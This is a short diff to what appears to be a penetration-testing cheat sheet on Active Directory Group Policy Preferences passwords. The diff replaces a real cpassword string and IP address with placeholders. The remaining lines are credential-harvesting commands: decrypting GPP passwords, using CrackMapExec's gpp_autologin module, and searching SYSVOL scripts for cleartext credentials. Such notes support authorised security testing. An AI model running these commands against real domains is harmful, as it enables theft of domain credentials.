@@ -10,10 +10,10 @@
 - **Payload/Method:**
   ```bash
   # Decrypt captured GPP cpassword
-  gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE
+  gpp-decrypt <cpassword_value>
 
   # Auto-find GPP passwords via CrackMapExec
-  crackmapexec smb 172.16.5.5 -u user -p pass -M gpp_autologin
+  crackmapexec smb <DC_IP> -u user -p pass -M gpp_autologin
 
   # Browse SYSVOL scripts folder for cleartext creds
   ls \\DC01\SYSVOL\DOMAIN.LOCAL\scripts
